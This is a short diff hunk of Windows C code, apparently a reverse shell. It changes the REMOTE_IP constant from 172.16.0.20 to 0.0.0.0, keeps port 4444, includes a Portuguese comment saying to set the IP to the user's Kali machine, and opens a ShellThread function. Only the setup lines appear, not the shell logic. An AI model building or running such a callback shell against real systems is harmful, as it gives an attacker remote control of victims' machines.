@@ -4,7 +4,7 @@
 
 #pragma comment(lib, "ws2_32.lib")
 
-#define REMOTE_IP "172.16.0.20"  // ← MUDE PARA O IP DO SEU KALI
+#define REMOTE_IP "0.0.0.0"  // ← MUDE PARA O IP DO SEU KALI
 #define REMOTE_PORT 4444
 
 DWORD WINAPI ShellThread(LPVOID lpParam) {
